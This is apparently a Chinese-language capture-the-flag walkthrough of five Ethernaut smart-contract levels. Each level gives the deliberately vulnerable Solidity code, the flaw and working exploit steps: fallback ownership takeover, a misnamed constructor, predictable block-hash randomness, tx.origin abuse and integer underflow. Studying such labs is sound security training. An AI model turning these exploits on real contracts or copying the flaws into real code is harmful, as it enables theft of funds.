# The Ethernaut by OpenZeppelin


## 01.Fallback
**要求** :
```
成为合约的owner
将余额减少为0
```

**合约代码** :
```
pragma solidity ^0.4.18;

import 'zeppelin-solidity/contracts/ownership/Ownable.sol';
import 'openzeppelin-solidity/contracts/math/SafeMath.sol';
//合约Fallback继承自Ownable
contract Fallback is Ownable {

  using SafeMath for uint256;
  mapping(address => uint) public contributions;
  //通过构造函数初始化贡献者的值为1000ETH
  function Fallback() public {
    contributions[msg.sender] = 1000 * (1 ether);
  }
  // 将合约所属者移交给贡献最高的人，这也意味着你必须要贡献1000ETH以上才有可能成为合约的owner
  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] = contributions[msg.sender].add(msg.value);
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }
 //获取请求者的贡献值
  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }
  //取款函数，且使用onlyOwner修饰，只能被合约的owner调用
  function withdraw() public onlyOwner {
    owner.transfer(this.balance);
  }
  //fallback函数，用于接收用户向合约发送的代币
  function() payable public {
    require(msg.value > 0 && contributions[msg.sender] > 0);// 判断了一下转入的钱和贡献者在合约中贡献的钱是否大于0
    owner = msg.sender;
  }
}

```
**分析** :
```
 问题代码:
 function() payable public {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }

 触发fallback()函数来实现
```

**攻击流程** :
```
contract.contribute({value: 1}) //首先使贡献值大于0
contract.sendTransaction({value: 1}) //执行一个不存在的函数, 触发fallback函数
contract.withdraw() //将合约的balance提走清零
```


## 02.Fallout
**要求** :
```
获取合约的owner权限
```


**合约代码** :
```
pragma solidity ^0.4.18;

import 'zeppelin-solidity/contracts/ownership/Ownable.sol';
import 'openzeppelin-solidity/contracts/math/SafeMath.sol';

contract Fallout is Ownable {

  using SafeMath for uint256;
  mapping (address => uint) allocations;

  /* constructor */
  function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }

  function allocate() public payable {
    allocations[msg.sender] = allocations[msg.sender].add(msg.value);
  }

  function sendAllocation(address allocator) public {
    require(allocations[allocator] > 0);
    allocator.transfer(allocations[allocator]);
  }

  function collectAllocations() public onlyOwner {
    msg.sender.transfer(this.balance);
  }

  function allocatorBalance(address allocator) public view returns (uint) {
    return allocations[allocator];
  }
}

```
**分析** :
```
 问题代码:
  function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }

  构造函数名称与合约名称不一致, public类型函数
```

**攻击流程** :
```
contract.Fal1out()
```


## 03.Coin Flip
**要求** :
```
掷硬币游戏, 10次猜测正确结果
```


**合约代码** :
```
pragma solidity ^0.4.18;

import 'openzeppelin-solidity/contracts/math/SafeMath.sol';

contract CoinFlip {

  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  function CoinFlip() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(block.blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}

```
**分析** :
```
    硬币翻转的结果取决于前一个区块的hash值, 区块之间有间隔时间, 该hash值可提取获知
```

**攻击流程** :
```
编写合约, 执行合约函数hack()

pragma solidity ^0.4.18;

contract CoinFlip {
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  function CoinFlip() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(block.blockhash(block.number-1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue/FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}

contract Exploit {
  CoinFlip expFlip;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  function exploit(address aimAddr) {
    expFlip = CoinFlip(aimAddr);
  }

  function hack() external returns (bool) {
    uint256 blockValue = uint256(block.blockhash(block.number-1));
    uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);
    bool guess = coinFlip == 1 ? true : false;
    return expFlip.flip(guess);
  }
}
```


## 04.Telephone
**要求** :
```
获取合约owner权限
```


**合约代码** :
```
pragma solidity ^0.4.18;

contract Telephone {

  address public owner;

  function Telephone() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```
**分析** :
```
 问题代码:
  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
    
  用户通过A合约来调用B合约, 对于B合约来说，msg.sender就代表合约A，而tx.origin就代表用户
   
```

**攻击流程** :
```
编写合约, 执行合约函数hack()

pragma solidity ^0.4.18;

contract Telephone {

  address public owner;

  function Telephone() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
contract Exploit {

    Telephone target = Telephone(0xebe18d78f098fdb84fd88506215e274fa7102416);

    function hack() external returns (bool){
        target.changeOwner(msg.sender);
        return true;
    }
}
```

## 05.Token
**要求** :
```
玩家初始有token20个，想办法黑掉合约, 获取得更多Token

```


**合约代码** :
```
pragma solidity ^0.4.18;
contract Token {
  mapping(address => uint) balances;
  uint public totalSupply;
  function Token(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }
  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }
  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}
```
**分析** :
```
 问题代码:
 balances[msg.sender]和_value都是无符号整数, 无论他们如何相减,结果都大于或等于0
 整数下溢, 20-21=2^256-1
   
```
**攻击流程** :
```
contract.transfer(0x6FFCBF0e05DB4aC3F7B2e7C2ED4Cc3098957b17F, 21)

```